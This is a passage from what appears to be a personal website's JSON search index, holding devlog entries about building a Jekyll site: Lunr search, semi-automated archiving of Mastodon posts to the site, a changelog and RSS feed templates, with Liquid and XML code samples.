(currentThemeX) { document. documentElement. setAttribute('data-theme', currentThemeX); } else if (matchMedia('(prefers-color-scheme: light)'). matches) { localStorage. setItem('theme', light ); } else if (matchMedia('(prefers-color-scheme: dark)'). matches) { localStorage. setItem('theme', classic ); } else { localStorage. setItem('theme', classic ); } &lt;/script&gt;Activity Feed: I‚Äôve previously discussed how I built the Activity Feed, and where I got the inspiration. It‚Äôs just a really fun way to visualize everything I am writing and sharing, chronologically weaved together. Note Card: The ‚ÄúNotebook‚Äù is where I file away short-form-style content (‚Äúnotes‚Äù), including PESOS‚Äòed social media posts. After creating notes as a unique collection type, with a theme reminiscent of a social media post, I had the idea to create a capability to ‚Äúembed‚Äù a note in another post, similar to how other social networks have embed code. The result is below‚Ä¶ Mike Sass@shellsharks 11/17/22 08:11 ‚ÄúIf you find yourself alone, riding in green fields with the sun on your face, do not be troubled.

I can‚Äôt be convinced otherwise. 45 Metatext Syndication: #life #movies Here‚Äôs the Liquid code I use to embed a note. {% assign note = site. notes | where: slug , Gladiator | first %}{% assign note_type = note. syndicate-to. last. name | downcase | remove: '.

(You can see the HTML/CSS structure by viewing source on the div id = ‚Äòncard‚Äô. ) Style Page: The Style page is just a cool, relatively unique addition to this site‚Äôs abundance of neat pages. What‚Äôs more, it is actually pretty helpful when I‚Äôm tinkering with the CSS or other design aspects of the site. This post from Patrick Weaver was fundamental in the development of my Style page. * All credit for this idea thought to fLaMEd üî• (check out their Style Guide). Scrolls: A newsletter is an idea I had had for a while before launching the first edition of Scrolls. You see, week after week I spend a good bit of time scrolling a lot of different feeds. In doing so, I come across a lot of cool stuff. Things that I save, some stuff I may share, things that I end up writing about, etc‚Ä¶ I realized that I was putting quite a bit of work into this, and what I was producing as a result of all that work, was so little. So, my idea was to convert, with really not that much more added effort, all the work I was doing by reading through and saving cool stuff across my feeds into something for everyone. Arcane curation from the IndieWeb, Fediverse and Cybersecurity realmsThis is a project I‚Äôm very excited about. I‚Äôve always said that security is magic. I also believe in the magic of the IndieWeb and of the Fediverse. Scrolls is centered around these three distinct topics, which is why it‚Äôs been imbued with a kindred dollop of magic and whimsy. Home Page (circa 2025): I write about my home page revamp here. The home page has gone through (at least) 4 major revisions since 2019, when I first started the site. I had major reservations about moving away from the classic, simple, clean, chronological list-of-posts aesthetic that I had been rocking since the beginning. But it only took a few minutes for me to realize not only how much more utility the new design had, but also how much better it did in telling folks what this site is about, what it has to offer, and what matters to me. I also think it looks awesome! Shark Fin &lt;hr&gt;: I talk all about how I built the shark fin &lt;hr&gt; here. But why did I do this? Sure yeah, I like sharks. But it ain‚Äôt really that. It‚Äôs more my love for little whimsical touches. I love the idea of having little easter eggs sprinkled throughout the site. Things that will surprise and delight not only my ‚Äúreaders‚Äù, but more importantly, me. I spend a lot of time just browsing around the pages of shellsharks, and these little touches make the experience all the better. So build cool things, and remember to look upon those things and smile. " }, { "id": 436, "url": "https://shellsharks.com/devlog/site-search", "title": "Site Search", "body": "2025/03/04 - I have a fair bit of content on my site. I‚Äôve been writing for over 5 years and at the time of this log have ~326 individual posts. My site is, and has always been, first and foremost a reference for myself. To be useful, to actually find stuff across all these posts, I need some sort of search capability. Here‚Äôs a brief history of the search capability on shellsharks. com and what I‚Äôd like to see search on this site do in the future‚Ä¶ Classic SearchWhen I first started the site, I picked a Jekyll theme that had already implemented search (super-search to be specific). Super search worked well enough, but in time I ran into some issues with it (which I honestly don‚Äôt remember what they were) and needed to find a new search solution. I liked super search because it displayed results dynamically as I typed my search query and it was decently fast/performant. From here, I went to Lunr. Modern SearchThe modern search capability on my site uses Lunr. js. It was easy enough to get started with, static-site-generator-compatible, and was easily tunable to search across all my different collection types. In practice, it works ok. It‚Äôs not ‚Äúdynamic‚Äù in the same way that super search was, and it‚Äôs a bit clunkier given that I have it on a dedicated search page and not in-line across the site, but it does a decent job surfacing what I am looking for using a BM25-based scoring system. Lunr supports wildcards, field-level search, search term boosting, fuzzy matches, and logical ANDs. It also has some customization and plugin capabilties, but I haven‚Äôt really toyed around with that (yet). All this said, it‚Äôs not perfect. There‚Äôs still a few things that my perfect vision of search would be able to do‚Ä¶ The only thing I‚Äôve really tinkered with related to Lunr is how I am constructing my page index. Below is the (very ugly) code that I have on my search page for creating the index. Notably, it specifies which pages are excluded from the index and then what front matter and body content is included across each collection type. Creating the Lunr Search Index: {% assign counter = 0 %}var documents = [{% for page in site. pages %}{% if page. url contains '. xml' or page. url contains 'assets' or page. url contains '. json' or page. url contains '. xsl' or page. title contains '- page' or page. url contains '/page/' or page. tags contains 'nosearch' %}{% else %}{ id : {{ counter }}, url : {{ site. url }}{{ page. url }} , title : {{ page. title }} , body : {{ page. content | markdownify | replace: '.

Look, Google and other web search providers aren‚Äôt what they used to be, that‚Äôs undeniable. But, you can go on Google right now and do a good ol‚Äô fashioned ‚Äúsite:shellsharks. com‚Äù search and pull back actual results from my site. So yeah, in a pinch, if your site is indexed by Google, or other search engines, you can fall back on that for search. Next-Generation SearchAlright, let me chat a bit about what I‚Äôd like to see in future versions of my sites search capability. I‚Äôve got a wishlist below actually‚Ä¶ Search Wish List Searches across all pages of my site, but customizable so I can limit based on front matter (e. g. tag), or collection type (e. g. link) Performant Regex-capable Supports boolean logic (i. e. AND, OR, NOT, etc‚Ä¶) Can be put in-line in the header, rather than having to load into the separate /search page Dynamically loads results (you don‚Äôt have to ‚Äúsubmit‚Äù the queries) as you enter search terms Search results return not only the page which matches the search term, but also a snippet from that page with the terms highlighted The ability to filter results based on a number of criteria (e. g. date, collection, tag, etc‚Ä¶) No server-side requirement (preferably)Yep, that‚Äôs it. Put search on your site!! " }, { "id": 437, "url": "https://shellsharks.com/devlog/mastodon-auto-pesos", "title": "Mastodon Auto-PESOS", "body": "2025/03/11 - As someone who has fully embraced the IndieWeb, owning my data and maintaining a canonical identity on the web is very important. Though I operate a lot of my online life directly out of my website, it doesn‚Äôt mean I don‚Äôt participate in other social networks. What I don‚Äôt want is for my ‚Äòcontent‚Äô to live solely within any external platform, silo or walled garden. Finding a way to archive or otherwise make this content available on my own site mitigates this. PESOS (i. e. ‚ÄúPublish Elsewhere Syndicate (to your) Own Site‚Äù) or what I like to call ‚Äúreverse syndication‚Äù is the practice of archiving content that is originally posted elsewhere on the web, back to your site - the single source of origin. The problem is, if a lot of your content originates outside your site, you have to either deal with the overhead of manually archiving it, or, find a way to automatically do it. Here, I talk about how I (finally) found a way to semi-auto-PESOS select Mastodon posts to the site. Traditionally, my syndication strategy has been very curated, and very manual. It‚Äôs time consuming to archive stuff I post elsewhere, and that overhead scales rapidly if I am generating a lot that originates not on my own site. It requires that I, A. remember to archive it at all, and B. that I make nuanced decisions about whether something is worth archiving to begin with. That threshold for whether something is worth it or not can vary depending on how lazy I am being, to be frank. If there was a way for me to automatically pull down posts, add the appropriate front-matter and use some logic to determine which posts I would actually want to bring back to my site, that would save me a lot of time! Not only that, but there would be things that could make it to my site that I traditionally wouldn‚Äôt have bothered to try and manually bring over. Awesome! Setting PESOS and data ownership aside for a second though, a big motivator for me wanting to pull in content from around the Internet was Molly White‚Äôs Activity feed. I loved the idea of just having that composite feed of everything I was up to all in one mega timeline. Bringing in Mastodon posts as I explain in this devlog is one piece to that ultimate indieweb-puzzle. Mastodon markdown archiveI‚Äôve had this dream of automating the reverse-syndication of my Mastodon posts since April(ish) of 2024, and had searched for ways to pull in this content off and on since then. Recently though, I came across this post, ‚ÄúArchiving and syndicating Mastodon posts‚Äù, which seemed to exactly meet my needs. 1 So, I cloned down the repo and tried it out! 2 It didn‚Äôt go well. I was getting an incomprehensible traceback and wasn‚Äôt sure how to troubleshoot. I thought, maybe it could be the version? So I tried a downgraded version and still no dice. Finally, I went back and actually re-read the original post and tried to follow slowly, step-by-step, and sure enough, it was something pretty simple that was the issue (isn‚Äôt it always?). Gabriel makes it pretty clear that the dist and user flags are required, and sure enough, they super are. I won‚Äôt dock any points from Gabriel for not handling those errors gracefully, after all, this is freely available and otherwise the script works great! Planning and Mechanics: OK, so I‚Äôve proved that I can get the script to work, now I needed to figure a few things out‚Ä¶ What posts did I want to pull in? (e. g. boosts, replies, public-only, etc‚Ä¶) Where do I want these posts to live on my site? What front matter is important to populate for these posts? What data is available in the . json output for each post? Do I need to tweak any of my existing code to accomodate the posts pulled in via this script?What to Archive?: The first challenge was part technical and part philosophical. What do I really want to archive? To start, I knew I didn‚Äôt care to archive my boosts/reblogs, so I can easily tune those out with the --exclude-reblogs flag. What about replies? Well I write a lot of (in my mind) great, well-thought-out replies, with info I‚Äôd love to hold on to and refer back to later. In fact, I‚Äôve manually reverse-syndicated a lot of this kind of post in the past. So I knew I needed replies, just not all of them. The overwhelming majority of my reply posts are short little comments that when I thought about it, weren‚Äôt really anything I cared to bring back to my site. Especially in a format that is site-searchable and would certainly junk up other parts of the site (e. g. tags page, search results, RSS feeds, etc‚Ä¶) I knew I would need to clean up any mass-export of posts that included replies, so to start I just created the full archive to see how many posts there were in total. The result was over 1000 and it became clear that I wasn't going to manually review each of those to see what was worth keeping. I needed a new approach. So, I decided to instead bring down just posts that I had marked public. More recently, when I post on Mastodon I‚Äôve given more thought to whether that post should be marked as ‚Äòpublic‚Äô or ‚Äòquiet public‚Äô (i. e. ‚Äòunlisted‚Äô). This foresight would pay off now as I wanted to only bring over a select few things that I felt were worthy of being public/exposed on my site. The problem is, I haven‚Äôt always been this mindful about what visibilty setting I post under. But it would have to do for now. So, how many posts did I have that were in fact public? Creating the filtered archive yielded only a few hundred posts - much more manageable to manually review. The compromise now was that maybe I‚Äôd miss a good reply that I had marked as unlisted some time ago, but I‚Äôve done a decent enough job manually syndicating things I thought were worth keeping for a good while now so I‚Äôm OK if maybe I missed something. Below are the flags I used to create my complete post archive of public toots (included replies). go run main. go \--user=https://shellsharks. social/@shellsharks \--dist=. /[OUTPUT FOLDER] \--exclude-reblogs \--filename='{{. Post. CreatedAt | date 2006-01-02 }}-shellsharks. social-{{. Post. Id}}. md' \--porcelain \--persist-last=. /last \--max-id=$(test -f . /last &amp;&amp; cat . /last || echo ) \--visibility=publicAfter clicking through each of the exported posts, I whittled the list down from 200-ish to about 50 posts. Not bad! Though it makes you wonder how important/worth it all of this effort is if I‚Äôm only interested in saving 50 things from nearly a year‚Äôs worth of tootin‚Äô. But, this last year I have also done a lot of manual reverse-syndicating which softened how many I needed to import now. ü§∑‚Äç‚ôÇÔ∏è Moving forward, I‚Äôll have to be thoughtful about what I mark as unlisted vs. what I mark as public. Anything public will come to my site. This is what my command looks like to import just the latest public posts‚Ä¶ go run main. go \--user=https://shellsharks. social/@shellsharks \--dist=/[DESTINATION DIR] \--exclude-reblogs \--filename='{{. Post. CreatedAt | date 2006-01-02 }}-shellsharks. social-{{. Post. Id}}. md' \--porcelain --persist-first=. /first --since-id=$(test -f . /first &amp;&amp; cat . /first || echo ) \--visibility=publicNotes: The second question was, where should these auto-syndicated posts live? In the original plan for my site, the Notes section was meant to house microblogs / social media posts, but I wasn‚Äôt sure I really wanted these auto-syndicated toots to junk up that timeline. In practice, the way I‚Äôve used the notes feed has been for content I thought was ‚Äúlower quality‚Äù than what was in my posts feed (e. g. shorter-form, less-researched, etc‚Ä¶). In hindsight, this was the wrong way to think about the notes feed. Over time, this approach resulted in me publishing a lot of things as Notes that should have just been Posts all along. This meant that my Notes feed had become HIGHER quality than I had intended it to be. So, rather than create yet another feed for these toots, I decided to revert back to the original, correct mode of thinking and house these toots as Notes on my site. Moving forward I plan to be less stingy about what I publish as a ‚ÄòPost‚Äô and much less precious about what gets ‚ÄòNote‚Äô status. If there was anything ‚Äòlower quality‚Äô than that, it probably doesn‚Äôt need to exist on my site. It‚Äôs also worth mentioning that my notes layout was built with a social media post design in mind from the beginning. So, it definitely made sense in the end to just bring these toots in as notes and have them live directly within my notebook feed. shellsharks@shellsharks 3/22/24 23:31 Alright fedi‚Äô, spit a ‚Äòverse, drop some knowledge. 8 Ivory for iOS Syndication: This said, they were‚Äônt given full rights and visibility across the blog (at least not for now), as I‚Äôll explain later‚Ä¶ Front Matter: Notes on my site have their own unique layout and some specific front matter metadata. To make this whole effort worth it, I needed the script to auto-populate as much of that metadata as possible. Thankfully, Gabriel solutioned for this‚Ä¶ This script supports a templating construct (located here /mastodon-markdown-archive/files/templates) which allows you to customize front matter. It will convert hashtags to jekyll tags, populate created dates, author names, etc‚Ä¶ This resource shows you some of the variables/data types you can work with from the . json export. Notably, I used the ‚ÄúAccount‚Äù and ‚ÄúPost‚Äù types to further enrich my post front matter. Below I show some of the more relevant tweaks to the default post. tmpl file‚Ä¶ layout: notetitle: shellsharks. social {{. Post. CreatedAt | date 1/2/06 15:04 MST }}author: {{ . Post. Account. DisplayName }}syndication: autosyndicate-to:- name: Mastodon url: {{ . Post. URI }} icon: ph ph-mastodon-logo{{- if . Post. Application}}posted-from: {{ . Post. Application. Name }}{{- end}}Customizing the date structure is super easy thanks to gomplate, and it‚Äôs nice that I can import the ‚ÄòApplication‚Äô used to publish the post and have that represented in my notes front matter metadata. Site Tweaks: To make this all work correctly I had to tweak a few things in my existing layouts and consider how this type of content would be fed into the various streams and feeds across the site. First, I excluded anything auto-syndicated from going into my RSS feeds. If you want to follow me on social media, you can do that, you can even subscribe to those RSS feeds directly. But I figured folks who subscribed to my blogs RSS didn‚Äôt need to have my exact social media posts fed into their RSS readers as well. Second, a lot of these PESOS‚Äôed toots do not have any hashtags, and thus do not come over with any tag front-matter. So I had to add a bit of logic on my tags page to make sure tagless posts didn‚Äôt show up in the list. Third, I added some additional logic to my activity streams on my home page to not show auto-syndicated toots. They will show up in my ‚ÄúInfosec-Only‚Äù stream and in the ‚ÄúLatest Note‚Äù card however. For all of this logic to work however, I added a flag in the front matter for these notes - syndication: auto. If I want to have these notes show up in my feeds/streams later, I can easily remove that flag and regenerate the site. Overall though, my site handled the addition of these notes pretty well - with minimal re-engineering üòÑ. Issues and the Future: I‚Äôm happy with the v1 of this capability, I think it will save me a lot of time and bring in content I never had the time to import/archive in the past. But, it isn‚Äôt without some issues, and there‚Äôs a lot I‚Äôd like to improve on into the future. Notes are brought in with no title, and reply posts are brought in without the OP context. I might take time to retroactively go back and add this information in. Since I‚Äôm being pretty selective about what gets brought over, this shouldn‚Äôt be that big of a task. This script solves for my Mastodon posts, but there‚Äôs a lot of other places I‚Äôd like to PESOS in a similar way (e. g. GoToSocial, Pixelfed, Bluesky, Reddit, Lemmy, etc‚Ä¶). Notably, this script does not work for GoToSocial or Pixelfed, so I‚Äôll either need to tweak it myself, find a new solution, or whip up some script of my own to do it. Until then, I will continue to manually reverse-syndicate things I think are worth it. For now, I am running this script manually, rather than having it auto-run as a GitHub action or cronjob on my local machine. In the future, I may want to automate it fully. If I do that, I‚Äôd like to find a way to auto update my changelog as well to reflect new imported notes. Finally, I‚Äôve considered making a separate feed that truly mirrors my Fediverse feed, importing all posts. This feed would be entirely isolated from my home page streams, search, tags, RSS feeds, etc‚Ä¶ It would literally just be a mirror of my Mastodon toots.

The Changelog is a day-by-day list of changes to the site. It is something I manually update and includes many, but not all, changes. I tend to call out content changes to individual blog posts, but typically avoid listing out each and every little modification to other bits of the site‚Äôs code. It serves as an easy way for me to capture updates to the site that wouldn‚Äôt otherwise be explicitly mentioned. The changelog is built using two separate constructs, a collection of weekly changes files and the changelog file itself. An example of the changes file front matter and markdown is shown below. ---layout: pagetitle: Weekly Changes 3/17/25-3/23/25description: Changes made March 17, 2025 - March 23, 2025date: 2025-03-17 00:00:00 -0500updated: 2025-03-17 23:54:00 -0400---###### March 17, 2025- List- of- changes- hereTo pull in each of the weekly changes files, the following Liquid code is employed. Pretty simple actually! {% assign changes = site. changes | sort: date | reverse %}{% assign latest = changes | first %}&lt;h1&gt;Changelog&lt;/h1&gt;Last Update: &lt;i&gt;{{latest. updated | date: '%B %-d, %Y | %l:%M %p %:z'}}&lt;/i&gt;&lt;hr/&gt;{% for change in paginator. posts %}{{ change. content }}{% endfor %}That‚Äôs it! In the future, It‚Äôd be nice if this log could be dynamically populated with things like net new content. Content changes to existing, posts would either still need to be manually updated here, or maybe even exist in per-post change logs. " }, { "id": 439, "url": "https://shellsharks.com/devlog/rsscaping", "title": "RSScaping", "body": "2025/03/19 - Having an RSS feed for your site‚Äôs content is one of the most important things you can do as a citizen of the open web. If you want people to tune into your writing, it just makes sense to have one. Or better yet, you could have many RSS feeds, as I do‚Äîeach from their own unique collection or topic(s). This site is built on top of Jekyll, a static-site generator. Each of the individual RSS feeds on my site are comprised of a . xml file which sets the feeds metadata and programattically generates the feed records, and a . xsl file which (very optionally) gives the feed a web view. In the years I‚Äôve had this site, I‚Äôve had to tune and tweak the . xml file quite a few times to continue to improve the way it works, the content it exposes and the metadata that is associated with the feed. Here I‚Äôll explain some of those tweaks and the thought process behind them. RSS XML File: My site‚Äôs RSS feed . xml file. I have substituted many values in the block below with placeholders such as [FEED NAME]. &lt;?xml version= 1. 0 encoding= UTF-8 ?&gt;&lt;?xml-stylesheet href= [LINK TO . XSL FILE] type= text/xsl ?&gt;&lt;rss version= 2. 0 xmlns:atom= http://www. w3. org/2005/Atom &gt; &lt;channel&gt; &lt;title&gt;{{ site. title | strip_html | xml_escape }} [FEED NAME]&lt;/title&gt; &lt;description&gt;{{ site. description | xml_escape }}&lt;/description&gt; &lt;link&gt;{{ site. url }}&lt;/link&gt; &lt;language&gt;en-us&lt;/language&gt; &lt;managingEditor&gt;[EMAIL] ([ALIAS])&lt;/managingEditor&gt; &lt;webMaster&gt;[EMAIL] ([ALIAS])&lt;/webMaster&gt; &lt;atom:link href= {{ [RELATIVE . XML FILE LOCATION] | prepend: site. baseurl | prepend: site. url }} rel= self type= application/rss+xml /&gt; &lt;pubDate&gt;{{ site. time | date_to_rfc822 }}&lt;/pubDate&gt; &lt;lastBuildDate&gt;{{ site. time | date_to_rfc822 }}&lt;/lastBuildDate&gt; &lt;image&gt; &lt;title&gt;{{ site. title | strip_html | xml_escape }} [FEED NAME]&lt;/title&gt; &lt;url&gt;{{ site. url }}{{ site. avatar_url }}&lt;/url&gt; &lt;link&gt;{{ site. url }}&lt;/link&gt; &lt;/image&gt; &lt;generator&gt;Jekyll v{{ jekyll. version }}&lt;/generator&gt; {% assign sorted_posts = site. posts | sort: 'date' | reverse %} {% for post in sorted_posts limit:100 %} &lt;item&gt; &lt;title&gt;{{ post. title | strip_html | xml_escape }}&lt;/title&gt; &lt;description&gt;{{ post. content | replace: 'href= /', 'href= https://[DOMAIN]/' | xml_escape }}&lt;/description&gt; &lt;pubDate&gt;{{ post. date | date_to_rfc822 }}&lt;/pubDate&gt; &lt;link&gt;{{ post. url | prepend: site. baseurl | prepend: site. url }}&lt;/link&gt; &lt;guid isPermaLink= true &gt;{{ post. url | prepend: site. baseurl | prepend: site. url }}&lt;/guid&gt; {% for tag in post. tags %} &lt;category&gt;{{ tag | xml_escape }}&lt;/category&gt; {% endfor %} {% for cat in post. categories %} &lt;category&gt;{{ cat | xml_escape }}&lt;/category&gt; {% endfor %} &lt;/item&gt; {% endfor %} &lt;/channel&gt;&lt;/rss&gt;Some important things to note from the . xml file‚Ä¶ There‚Äôs a lot of html stripping (strip_html) and xml escaping (xml_escape) being done. This is because RSS clients, and general RSS spec gets very cranky about certain characters being included in feeds. For any date-related tags, be sure to use RFC822-compatible (date_to_rfc822) date strings. Otherwise things break. Remember to sort your RSS feed output using sort: 'date' | reverse. You can limit the number of posts that are included in your generated RSS feed by using the limit:[COUNT] directive in your Liquid for loop (as I did here {% for post in sorted_posts limit:100 %}). For a full-content feed, use the following syntax in your &lt;generator&gt;&lt;description&gt; tag ‚¨áÔ∏è. This uses the content variable to pull in the full content, fixes relative links with replace: 'href= /', 'href= https://[DOMAIN]/' and then does the usual xml_escape operation. {{ post. content \| replace: 'href= /', 'href= https://[DOMAIN]/' \| xml_escape }} You can limit the source collections an RSS feed is generated from using something like this: {% assign pagesandnotes = site. posts \| concat: site. notes \| concat: site. scrolls %} You can filter the feed records by front matter tags using syntax such as this: {% if post. tags contains 'fediverse' or post. tags contains 'social' or post. tags contains 'indieweb' %} Create an individual . xml and . xsl file for each RSS feed you‚Äôre interested in having! A lot of the code is reusable with minor tweaks to customize for each of your feed usecases. RSS XSL File: My site‚Äôs RSS feed . xsl file. I have substituted many values in the block below with placeholders such as [RSS FEED TITLE]. XSL, or eXtensible Stylesheet Lanugage is a styling language for XML. The syntax is somewhat arcane, but easy enough to use to create something simple like I have to spruce up your raw . xml RSS feeds (or other . xml files like a Sitemap). I won‚Äôt spend time explaining the xsl-related syntax, as I believe you can kinda reverse-engineer how they work by looking at what is below, but I will note that you can use Jekyll includes to further stylize and bring these xml files under the umbrella of your site‚Äôs larger thematic design. &lt;?xml version= 1. 0 encoding= utf-8 ?&gt;&lt;xsl:stylesheet version= 3. 0 xmlns:xsl= http://www. w3. org/1999/XSL/Transform xmlns:atom= http://www. w3. org/2005/Atom xmlns:dc= http://purl. org/dc/elements/1. 1/ xmlns:itunes= http://www. itunes. com/dtds/podcast-1. 0. dtd &gt; &lt;xsl:output method= html version= 1. 0 encoding= UTF-8 indent= yes /&gt; &lt;xsl:template match= / &gt; &lt;html xmlns= http://www. w3. org/1999/xhtml &gt; &lt;head&gt; &lt;title&gt;&lt;xsl:value-of select= /rss/channel/title /&gt; [RSS FEED TITLE]&lt;/title&gt; &lt;meta http-equiv= Content-Type content= text/html; charset=utf-8 /&gt; &lt;meta name= viewport content= width=device-width, initial-scale=1, maximum-scale=1 /&gt; &lt;meta charset= UTF-8 /&gt; &lt;link rel= stylesheet href= [LINK TO CSS FILE] /&gt; &lt;/head&gt; &lt;body&gt; &lt;header&gt; &lt;div class= sitetitle &gt; &lt;a href= / &gt;&lt;img src= [HEADER IMAGE] alt= [ALT TITLE] height= 30 /&gt;&lt;/a&gt; &lt;/div&gt; &lt;div class= head &gt; &lt;div class= description &gt; &lt;p&gt;&lt;xsl:value-of select= /rss/channel/description /&gt;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class= aboutfeeds &gt; &lt;p&gt;This is a web feed that can be viewed in the browser. &lt;strong&gt;Subscribe for free&lt;/strong&gt; by copying the URL &lt;code&gt;&lt;mark&gt;[.
